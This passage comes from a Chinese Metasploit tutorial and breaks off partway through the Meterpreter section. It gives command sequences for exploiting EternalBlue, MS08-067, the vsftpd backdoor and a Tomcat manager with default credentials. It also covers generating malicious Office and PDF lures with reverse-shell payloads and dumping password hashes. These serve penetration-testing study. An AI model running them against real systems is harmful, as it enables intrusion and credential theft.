

> Metasploit Framework (MSF) 是世界上最流行的渗透测试框架
> 本笔记基于 Metasploit 6.x 版本，运行环境为 Kali Linux
> 涵盖从入门到高级的完整内容，包含大量实战案例

---

## 目录

1. [Metasploit 简介](#1-metasploit-简介)
2. [安装与配置](#2-安装与配置)
3. [基础架构](#3-基础架构)
4. [MSFconsole 基础](#4-msfconsole-基础)
5. [信息收集](#5-信息收集)
6. [漏洞扫描](#6-漏洞扫描)
7. [漏洞利用](#7-漏洞利用)
8. [Payload 详解](#8-payload-详解)
9. [Meterpreter 详解](#9-meterpreter-详解)
10. [后渗透攻击](#10-后渗透攻击)
11. [权限提升](#11-权限提升)
12. [持久化访问](#12-持久化访问)
13. [横向移动](#13-横向移动)
14. [免杀技术](#14-免杀技术)
15. [MSFvenom 详解](#15-msfvenom-详解)
16. [Armitage 图形界面](#16-armitage-图形界面)
17. [自动化与脚本](#17-自动化与脚本)
18. [实战案例](#18-实战案例)
19. [常见错误与解决方案](#19-常见错误与解决方案)
20. [最佳实践与安全建议](#20-最佳实践与安全建议)

---

## 1. Metasploit 简介

### 1.1 什么是 Metasploit？

Metasploit Framework 是一个开源的渗透测试和漏洞利用框架，由 H.D. Moore 于 2003 年创建，现由 Rapid7 公司维护。它是安全专业人员进行渗透测试、漏洞研究和 IDS 签名开发的必备工具。

```
┌─────────────────────────────────────────────────────────────────┐
│                    Metasploit 工作流程                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   信息收集 ──> 漏洞扫描 ──> 漏洞利用 ──> 后渗透 ──> 报告        │
│                                                                 │
│   ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌─────────┐        │
│   │ Recon   │──>│ Scan    │──>│ Exploit │──>│ Post    │        │
│   │ 侦察    │   │ 扫描    │   │ 利用    │   │ 后渗透  │        │
│   └─────────┘   └─────────┘   └─────────┘   └─────────┘        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Metasploit 版本

| 版本 | 说明 | 特点 |
|------|------|------|
| Metasploit Framework | 开源免费版 | 命令行界面，功能完整 |
| Metasploit Pro | 商业版 | 图形界面，自动化功能，报告生成 |
| Metasploit Express | 简化商业版 | 针对中小企业 |
| Metasploit Community | 社区版 | 基础 Web 界面 |

> 本笔记主要介绍开源的 Metasploit Framework

### 1.3 核心功能

Metasploit 提供了以下核心功能：

- **漏洞利用（Exploits）**：针对已知漏洞的攻击代码
- **有效载荷（Payloads）**：漏洞利用成功后执行的代码
- **辅助模块（Auxiliary）**：扫描、嗅探、模糊测试等辅助功能
- **后渗透模块（Post）**：获取访问权限后的进一步操作
- **编码器（Encoders）**：对 Payload 进行编码以绕过检测
- **空指令（Nops）**：用于填充的无操作指令

### 1.4 为什么学习 Metasploit？

1. **行业标准**：渗透测试领域最广泛使用的工具
2. **模块丰富**：包含数千个漏洞利用模块
3. **持续更新**：社区活跃，新漏洞快速集成
4. **学习价值**：理解漏洞利用原理的最佳途径
5. **自动化能力**：支持脚本和自动化测试

---

## 2. 安装与配置

### 2.1 在 Kali Linux 中使用

Kali Linux 预装了 Metasploit Framework，这是最推荐的使用方式。

```bash
# 检查 Metasploit 版本
msfconsole -v

# 更新 Metasploit
sudo apt update
sudo apt install metasploit-framework

# 或使用 msfupdate（已弃用，建议用 apt）
sudo msfupdate
```

### 2.2 在其他 Linux 发行版安装

```bash
# 使用官方安装脚本（推荐）
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# 手动安装依赖（Ubuntu/Debian）
sudo apt install -y curl gnupg2 software-properties-common
curl -fsSL https://apt.metasploit.com/metasploit-framework.gpg.key | sudo apt-key add -
sudo add-apt-repository "deb https://apt.metasploit.com/ $(lsb_release -cs) main"
sudo apt update
sudo apt install metasploit-framework
```

### 2.3 数据库配置

Metasploit 使用 PostgreSQL 数据库存储扫描结果、凭证等信息。

```bash
# 启动 PostgreSQL 服务
sudo systemctl start postgresql
sudo systemctl enable postgresql

# 初始化 Metasploit 数据库
sudo msfdb init

# 检查数据库状态
sudo msfdb status

# 重新初始化数据库（如果出问题）
sudo msfdb reinit
```

### 2.4 首次启动

```bash
# 启动 msfconsole
msfconsole

# 启动时跳过 banner
msfconsole -q

# 检查数据库连接
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

### 2.5 目录结构

```
/usr/share/metasploit-framework/
├── modules/              # 模块目录
│   ├── exploits/        # 漏洞利用模块
│   ├── auxiliary/       # 辅助模块
│   ├── post/            # 后渗透模块
│   ├── payloads/        # Payload 模块
│   ├── encoders/        # 编码器模块
│   └── nops/            # 空指令模块
├── data/                # 数据文件
├── scripts/             # 脚本文件
├── tools/               # 工具
├── plugins/             # 插件
└── documentation/       # 文档

~/.msf4/                 # 用户配置目录
├── modules/             # 自定义模块
├── plugins/             # 自定义插件
├── logs/                # 日志文件
├── loot/                # 收集的数据
└── local/               # 本地数据
```

---

## 3. 基础架构

### 3.1 模块类型详解

Metasploit 的核心是其模块化架构，理解各类模块是使用 MSF 的基础。

```
┌─────────────────────────────────────────────────────────────────┐
│                    Metasploit 模块架构                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────┐     │
│   │   Exploits   │    │  Auxiliary   │    │    Post      │     │
│   │   漏洞利用   │    │   辅助模块   │    │   后渗透     │     │
│   └──────────────┘    └──────────────┘    └──────────────┘     │
│          │                   │                   │              │
│          ▼                   ▼                   ▼              │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────┐     │
│   │   Payloads   │    │   Encoders   │    │    Nops      │     │
│   │   有效载荷   │    │    编码器    │    │   空指令     │     │
│   └──────────────┘    └──────────────┘    └──────────────┘     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 3.1.1 Exploits（漏洞利用模块）

漏洞利用模块是 Metasploit 的核心，用于利用目标系统的安全漏洞。

```bash
# 漏洞利用模块分类
exploits/
├── windows/          # Windows 系统漏洞
│   ├── smb/         # SMB 协议漏洞
│   ├── http/        # HTTP 服务漏洞
│   └── local/       # 本地提权漏洞
├── linux/           # Linux 系统漏洞
├── unix/            # Unix 系统漏洞
├── multi/           # 跨平台漏洞
├── android/         # Android 漏洞
└── osx/             # macOS 漏洞
```

#### 3.1.2 Payloads（有效载荷）

Payload 是漏洞利用成功后在目标系统上执行的代码。

| 类型 | 说明 | 示例 |
|------|------|------|
| Singles | 独立 Payload，一次性发送 | `windows/shell_reverse_tcp` |
| Stagers | 分阶段 Payload 的第一阶段 | `windows/meterpreter/reverse_tcp` |
| Stages | 分阶段 Payload 的第二阶段 | Meterpreter 主体 |

```bash
# Payload 命名规则
<平台>/<类型>/<连接方式>

# 示例
windows/meterpreter/reverse_tcp    # Windows Meterpreter 反向 TCP
linux/x64/shell_reverse_tcp        # Linux 64位 反向 Shell
php/meterpreter_reverse_tcp        # PHP Meterpreter
```

#### 3.1.3 Auxiliary（辅助模块）

辅助模块用于信息收集、扫描、嗅探等不直接利用漏洞的操作。

```bash
auxiliary/
├── scanner/          # 扫描模块
│   ├── portscan/    # 端口扫描
│   ├── smb/         # SMB 扫描
│   └── http/        # HTTP 扫描
├── gather/          # 信息收集
├── fuzzers/         # 模糊测试
├── dos/             # 拒绝服务
├── sniffer/         # 嗅探器
└── admin/           # 管理功能
```

#### 3.1.4 Post（后渗透模块）

后渗透模块在获得目标访问权限后使用，用于进一步的信息收集和权限提升。

```bash
post/
├── windows/         # Windows 后渗透
│   ├── gather/     # 信息收集
│   ├── manage/     # 系统管理
│   └── escalate/   # 权限提升
├── linux/          # Linux 后渗透
├── multi/          # 跨平台
└── osx/            # macOS 后渗透
```

### 3.2 数据库架构

```bash
# Metasploit 数据库表结构
msf6 > db_status
msf6 > hosts           # 主机信息
msf6 > services        # 服务信息
msf6 > vulns           # 漏洞信息
msf6 > creds           # 凭证信息
msf6 > loot            # 收集的数据
msf6 > notes           # 笔记
```

---

## 4. MSFconsole 基础

### 4.1 启动与界面

MSFconsole 是 Metasploit 的主要命令行界面，功能最完整。

```bash
# 启动方式
msfconsole              # 正常启动
msfconsole -q           # 安静模式（不显示 banner）
msfconsole -r script.rc # 执行资源脚本
msfconsole -x "命令"    # 执行命令后退出

# 启动后的界面
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||

       =[ metasploit v6.3.4-dev ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 410 post ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops ]
+ -- --=[ 9 evasion ]

msf6 >
```

### 4.2 核心命令

#### 4.2.1 帮助与导航

```bash
# 获取帮助
msf6 > help                    # 显示所有命令
msf6 > help search             # 显示特定命令帮助
msf6 > ?                       # 同 help

# 命令历史
msf6 > history                 # 查看命令历史

# 清屏
msf6 > clear
```

#### 4.2.2 模块搜索与选择

```bash
# 搜索模块
msf6 > search ms17-010                    # 搜索永恒之蓝
msf6 > search type:exploit platform:windows  # 按类型和平台搜索
msf6 > search cve:2021                    # 按 CVE 搜索
msf6 > search name:smb                    # 按名称搜索
msf6 > search author:hdm                  # 按作者搜索
msf6 > search rank:excellent              # 按等级搜索

# 搜索过滤器
# type:     exploit, auxiliary, post, payload, encoder, nop, evasion
# platform: windows, linux, unix, osx, android, php, java
# rank:     excellent, great, good, normal, average, low, manual

# 使用模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) >

# 返回上一级
msf6 exploit(...) > back

# 查看模块信息
msf6 exploit(...) > info
msf6 exploit(...) > show options
msf6 exploit(...) > show advanced
msf6 exploit(...) > show targets
msf6 exploit(...) > show payloads
```

#### 4.2.3 参数设置

```bash
# 设置参数
msf6 exploit(...) > set RHOSTS 192.168.1.100      # 设置目标主机
msf6 exploit(...) > set RPORT 445                  # 设置目标端口
msf6 exploit(...) > set LHOST 192.168.1.50        # 设置本地主机（监听）
msf6 exploit(...) > set LPORT 4444                # 设置本地端口
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 取消设置
msf6 exploit(...) > unset RHOSTS
msf6 exploit(...) > unset all                     # 取消所有设置

# 全局设置（对所有模块生效）
msf6 > setg LHOST 192.168.1.50
msf6 > setg LPORT 4444

# 查看设置
msf6 exploit(...) > show options
msf6 exploit(...) > show missing                  # 显示缺少的必需参数

# 保存设置
msf6 > save                                       # 保存当前设置
```

#### 4.2.4 执行与会话管理

```bash
# 执行漏洞利用
msf6 exploit(...) > exploit                       # 执行（前台）
msf6 exploit(...) > run                           # 同 exploit
msf6 exploit(...) > exploit -j                    # 后台执行
msf6 exploit(...) > exploit -z                    # 成功后不交互

# 会话管理
msf6 > sessions                                   # 列出所有会话
msf6 > sessions -l                                # 详细列表
msf6 > sessions -i 1                              # 进入会话 1
msf6 > sessions -k 1                              # 终止会话 1
msf6 > sessions -K                                # 终止所有会话
msf6 > sessions -u 1                              # 升级 shell 到 meterpreter

# 在会话中执行命令
msf6 > sessions -c "whoami" -i 1                  # 在会话 1 中执行命令
```

### 4.3 数据库命令

```bash
# 数据库状态
msf6 > db_status

# 工作区管理（用于组织不同项目）
msf6 > workspace                                  # 列出工作区
msf6 > workspace -a project1                      # 创建工作区
msf6 > workspace project1                         # 切换工作区
msf6 > workspace -d project1                      # 删除工作区

# 主机管理
msf6 > hosts                                      # 列出所有主机
msf6 > hosts -a 192.168.1.100                    # 添加主机
msf6 > hosts -d 192.168.1.100                    # 删除主机
msf6 > hosts -c address,os_name,os_flavor        # 显示特定列

# 服务管理
msf6 > services                                   # 列出所有服务
msf6 > services -p 445                           # 按端口过滤
msf6 > services -s http                          # 按服务名过滤

# 漏洞管理
msf6 > vulns                                      # 列出漏洞

# 凭证管理
msf6 > creds                                      # 列出凭证
msf6 > creds -a 192.168.1.100 -p 445 -u admin -P password

# 导入导出
msf6 > db_import scan.xml                        # 导入 Nmap 扫描结果
msf6 > db_export -f xml output.xml               # 导出数据库
msf6 > db_nmap -sV 192.168.1.0/24               # 直接运行 Nmap 并存储结果
```

### 4.4 实用命令

```bash
# 系统命令
msf6 > spool /tmp/msf.log                        # 记录输出到文件
msf6 > spool off                                 # 停止记录

# 资源脚本
msf6 > makerc /tmp/my_script.rc                  # 保存命令历史为脚本
msf6 > resource /tmp/my_script.rc                # 执行资源脚本

# 插件
msf6 > load                                      # 列出可用插件
msf6 > load nessus                               # 加载 Nessus 插件
msf6 > unload nessus                             # 卸载插件

# 连接
msf6 > connect 192.168.1.100 80                  # TCP 连接
msf6 > connect -s 192.168.1.100 443              # SSL 连接

# 退出
msf6 > exit
msf6 > quit
```

---

## 5. 信息收集

信息收集是渗透测试的第一步，Metasploit 提供了丰富的辅助模块用于信息收集。

### 5.1 端口扫描

```bash
# TCP 端口扫描
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
msf6 auxiliary(scanner/portscan/tcp) > run

# SYN 扫描（需要 root 权限）
msf6 > use auxiliary/scanner/portscan/syn
msf6 auxiliary(scanner/portscan/syn) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/portscan/syn) > set PORTS 1-65535
msf6 auxiliary(scanner/portscan/syn) > run

# 使用 db_nmap（推荐，结果自动存入数据库）
msf6 > db_nmap -sS -sV -O 192.168.1.0/24
msf6 > db_nmap -sC -sV -p- 192.168.1.100
```

### 5.2 服务识别

```bash
# SMB 版本扫描
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > run

# SSH 版本扫描
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ssh/ssh_version) > run

# HTTP 版本扫描
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/http/http_version) > run

# FTP 版本扫描
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ftp/ftp_version) > run

# MySQL 版本扫描
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/mysql/mysql_version) > run
```

### 5.3 用户枚举

```bash
# SMB 用户枚举
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_enumusers) > run

# SMB 共享枚举
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_enumshares) > run

# SNMP 枚举
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/snmp/snmp_enum) > run

# SMTP 用户枚举
msf6 > use auxiliary/scanner/smtp/smtp_enum
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > run
```

### 5.4 Web 信息收集

```bash
# 目录扫描
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/dir_scanner) > set DICTIONARY /usr/share/wordlists/dirb/common.txt
msf6 auxiliary(scanner/http/dir_scanner) > run

# 文件扫描
msf6 > use auxiliary/scanner/http/files_dir
msf6 auxiliary(scanner/http/files_dir) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/files_dir) > run

# robots.txt 扫描
msf6 > use auxiliary/scanner/http/robots_txt
msf6 auxiliary(scanner/http/robots_txt) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/robots_txt) > run

# HTTP 头信息
msf6 > use auxiliary/scanner/http/http_header
msf6 auxiliary(scanner/http/http_header) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/http_header) > run

# WordPress 扫描
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/wordpress_scanner) > run
```

### 5.5 网络发现

```bash
# ARP 扫描
msf6 > use auxiliary/scanner/discovery/arp_sweep
msf6 auxiliary(scanner/discovery/arp_sweep) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/discovery/arp_sweep) > run

# UDP 扫描
msf6 > use auxiliary/scanner/discovery/udp_sweep
msf6 auxiliary(scanner/discovery/udp_sweep) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/discovery/udp_sweep) > run

# ICMP 扫描
msf6 > use auxiliary/scanner/discovery/ipv6_neighbor
msf6 auxiliary(scanner/discovery/ipv6_neighbor) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/discovery/ipv6_neighbor) > run
```

---

## 6. 漏洞扫描

### 6.1 内置漏洞扫描

```bash
# SMB 漏洞扫描
# MS17-010 (永恒之蓝) 检测
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

# MS08-067 检测
msf6 > use auxiliary/scanner/smb/ms08_067_check
msf6 auxiliary(scanner/smb/ms08_067_check) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/ms08_067_check) > run

# SSH 漏洞扫描
msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run

# FTP 匿名登录检测
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ftp/anonymous) > run

# VNC 无认证检测
msf6 > use auxiliary/scanner/vnc/vnc_none_auth
msf6 auxiliary(scanner/vnc/vnc_none_auth) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/vnc/vnc_none_auth) > run
```

### 6.2 使用 Nmap 脚本

```bash
# 使用 Nmap 漏洞扫描脚本
msf6 > db_nmap --script vuln 192.168.1.100
msf6 > db_nmap --script smb-vuln* 192.168.1.100
msf6 > db_nmap --script http-vuln* 192.168.1.100

# 查看扫描结果
msf6 > vulns
```

### 6.3 集成 Nessus

```bash
# 加载 Nessus 插件
msf6 > load nessus

# 连接 Nessus
msf6 > nessus_connect username:password@localhost:8834

# 列出扫描策略
msf6 > nessus_policy_list

# 创建扫描
msf6 > nessus_scan_new <policy_id> <scan_name> <targets>

# 导入 Nessus 扫描结果
msf6 > nessus_report_hosts <report_id>
msf6 > nessus_report_vulns <report_id>
```

### 6.4 集成 OpenVAS

```bash
# 加载 OpenVAS 插件
msf6 > load openvas

# 连接 OpenVAS
msf6 > openvas_connect admin password localhost 9390

# 列出目标
msf6 > openvas_target_list

# 创建扫描
msf6 > openvas_task_create <name> <comment> <config_id> <target_id>

# 启动扫描
msf6 > openvas_task_start <task_id>
```

---

## 7. 漏洞利用

### 7.1 漏洞利用流程

```
┌─────────────────────────────────────────────────────────────────┐
│                    漏洞利用标准流程                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 搜索模块    search <关键词>                                │
│         ↓                                                       │
│   2. 选择模块    use <模块路径>                                 │
│         ↓                                                       │
│   3. 查看信息    info / show options                            │
│         ↓                                                       │
│   4. 设置参数    set RHOSTS / set PAYLOAD                       │
│         ↓                                                       │
│   5. 检查设置    show options / check                           │
│         ↓                                                       │
│   6. 执行利用    exploit / run                                  │
│         ↓                                                       │
│   7. 后渗透      进入 Meterpreter 或 Shell                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2 经典漏洞利用示例

#### 7.2.1 MS17-010 永恒之蓝（EternalBlue）

这是影响 Windows SMB 服务的著名漏洞，被 WannaCry 勒索软件利用。

```bash
# 搜索模块
msf6 > search ms17-010

# 选择漏洞利用模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 查看模块信息
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

# 查看可用目标
msf6 exploit(...) > show targets

# 设置目标主机
msf6 exploit(...) > set RHOSTS 192.168.1.100

# 设置 Payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 设置本地监听
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 检查目标是否存在漏洞
msf6 exploit(...) > check

# 执行漏洞利用
msf6 exploit(...) > exploit

# 成功后进入 Meterpreter
meterpreter > sysinfo
meterpreter > getuid
```

#### 7.2.2 MS08-067（经典 Windows 漏洞）

影响 Windows XP/2003 的经典漏洞。

```bash
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 选择目标系统版本（重要！）
msf6 exploit(...) > show targets
msf6 exploit(...) > set TARGET 34  # Windows XP SP3 Chinese

msf6 exploit(...) > exploit
```

#### 7.2.3 vsftpd 2.3.4 后门

vsftpd 2.3.4 版本包含一个后门。

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.100
msf6 exploit(...) > exploit

# 成功后获得 root shell
id
whoami
```

#### 7.2.4 Tomcat 管理器漏洞

利用 Tomcat 管理器弱口令上传 WAR 文件。

```bash
# 首先扫描 Tomcat 管理器
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set RPORT 8080
msf6 auxiliary(...) > run

# 利用获取的凭证
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set RPORT 8080
msf6 exploit(...) > set HttpUsername tomcat
msf6 exploit(...) > set HttpPassword tomcat
msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

#### 7.2.5 PHP 远程代码执行

```bash
# PHP CGI 参数注入
msf6 > use exploit/multi/http/php_cgi_arg_injection
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

### 7.3 Web 应用漏洞利用

```bash
# SQL 注入
msf6 > use auxiliary/sqli/oracle/dbms_export_extension

# 文件包含
msf6 > use exploit/unix/webapp/php_include

# 命令注入
msf6 > use exploit/multi/http/jenkins_script_console

# 反序列化漏洞
msf6 > use exploit/multi/misc/java_rmi_server

# Struts2 漏洞
msf6 > search struts2
msf6 > use exploit/multi/http/struts2_content_type_ognl
```

### 7.4 客户端攻击

```bash
# 浏览器漏洞利用
msf6 > use exploit/windows/browser/ie_execcommand_uaf
msf6 exploit(...) > set SRVHOST 192.168.1.50
msf6 exploit(...) > set SRVPORT 8080
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# 生成恶意链接发送给目标
# [*] Using URL: http://192.168.1.50:8080/xxxxx

# Office 文档漏洞
msf6 > use exploit/windows/fileformat/office_word_hta
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# PDF 漏洞
msf6 > use exploit/windows/fileformat/adobe_pdf_embedded_exe
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

---

## 8. Payload 详解

### 8.1 Payload 类型

```
┌─────────────────────────────────────────────────────────────────┐
│                      Payload 类型对比                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   Singles (单一 Payload)                                        │
│   ├── 完整独立的 Payload                                        │
│   ├── 一次性发送，体积较大                                      │
│   └── 示例：windows/shell_reverse_tcp                           │
│                                                                 │
│   Stagers + Stages (分阶段 Payload)                             │
│   ├── Stager：小型引导程序，建立连接                            │
│   ├── Stage：主要功能代码，通过连接传输                         │
│   └── 示例：windows/meterpreter/reverse_tcp                     │
│             ↑ stage      ↑ stager                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 连接方式

| 类型 | 说明 | 使用场景 |
|------|------|----------|
| `reverse_tcp` | 目标主动连接攻击者 | 目标在防火墙后，最常用 |
| `bind_tcp` | 攻击者连接目标开放的端口 | 攻击者在防火墙后 |
| `reverse_http` | 通过 HTTP 反向连接 | 绕过防火墙 |
| `reverse_https` | 通过 HTTPS 反向连接 | 加密通信，绕过检测 |
| `reverse_tcp_allports` | 尝试所有端口反向连接 | 绕过端口限制 |

### 8.3 常用 Payload

```bash
# Windows Payload
windows/meterpreter/reverse_tcp          # 最常用
windows/meterpreter/reverse_https        # HTTPS 加密
windows/x64/meterpreter/reverse_tcp      # 64位系统
windows/shell/reverse_tcp                # 普通 shell
windows/shell_reverse_tcp                # 单一 shell

# Linux Payload
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp
linux/x64/shell_reverse_tcp

# macOS Payload
osx/x64/meterpreter/reverse_tcp
osx/x64/shell_reverse_tcp

# 跨平台 Payload
java/meterpreter/reverse_tcp             # Java 环境
php/meterpreter/reverse_tcp              # PHP 环境
python/meterpreter/reverse_tcp           # Python 环境
cmd/unix/reverse_bash                    # Bash 反向 shell
cmd/unix/reverse_python                  # Python 反向 shell

# Android Payload
android/meterpreter/reverse_tcp
android/meterpreter/reverse_https
```

### 8.4 Payload 选择策略

```bash
# 查看可用 Payload
msf6 exploit(...) > show payloads

# 根据目标系统选择
# 1. 确定目标架构（x86/x64）
# 2. 确定目标系统（Windows/Linux/macOS）
# 3. 确定连接方式（reverse/bind）
# 4. 确定是否需要加密（http/https）

# 示例：Windows 64位目标，需要绕过防火墙
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_https

# 示例：Linux 目标，简单测试
msf6 exploit(...) > set PAYLOAD linux/x64/shell_reverse_tcp
```

### 8.5 监听器设置

```bash
# 使用 multi/handler 设置监听器
msf6 > use exploit/multi/handler

# 设置 Payload（必须与生成的 Payload 一致）
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444

# 后台运行监听器
msf6 exploit(multi/handler) > exploit -j

# 查看后台任务
msf6 > jobs
msf6 > jobs -l

# 终止任务
msf6 > jobs -k 0
```

---

## 9. Meterpreter 详解

Meterpreter 是 Metasploit 最强大的 Payload，提供了丰富的后渗透功能。

### 9.1 Meterpreter 特点

- **内存驻留**：不写入磁盘，难以被检测
- **加密通信**：与攻击者之间的通信加密
- **动态扩展**：可以动态加载扩展模块
- **跨平台**：支持 Windows、Linux、macOS、Android 等

### 9.2 基础命令

```bash
# 系统信息
meterpreter > sysinfo                    # 系统信息
meterpreter > getuid                     # 当前用户
meterpreter > getpid                     # 当前进程 ID
meterpreter > ps                         # 进程列表
meterpreter > getprivs                   # 当前权限

# 文件系统
meterpreter > pwd                        # 当前目录
meterpreter > cd /path                   # 切换目录
meterpreter > ls                         # 列出文件
meterpreter > cat file.txt               # 查看文件
meterpreter > download file.txt          # 下载文件
meterpreter > upload local.txt remote.txt # 上传文件
meterpreter > edit file.txt              # 编辑文件
meterpreter > rm file.txt                # 删除文件
meterpreter > mkdir dirname              # 创建目录
meterpreter > rmdir dirname              # 删除目录
meterpreter > search -f *.txt            # 搜索文件

# 网络
meterpreter > ipconfig                   # 网络配置
meterpreter > ifconfig                   # 同上（Linux）
meterpreter > route                      # 路由表
meterpreter > arp                        # ARP 表
meterpreter > netstat                    # 网络连接
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100  # 端口转发

# 进程管理
meterpreter > ps                         # 列出进程
meterpreter > kill <pid>                 # 终止进程
meterpreter > migrate <pid>              # 迁移到其他进程
meterpreter > execute -f cmd.exe         # 执行程序
meterpreter > execute -f cmd.exe -i -H   # 交互式隐藏执行

# 会话管理
meterpreter > background                 # 后台运行
meterpreter > exit                       # 退出
meterpreter > shell                      # 进入系统 shell
meterpreter > channel -l                 # 列出通道
meterpreter > channel -i <id>            # 进入通道
```

### 9.3 高级命令

```bash
# 权限提升
meterpreter > getsystem                  # 尝试提权到 SYSTEM
meterpreter > getprivs                   # 查看权限

# 密码获取
meterpreter > hashdump                   # 导出密码哈希
meterpreter > load kiwi                  # 加载 Mimikatz
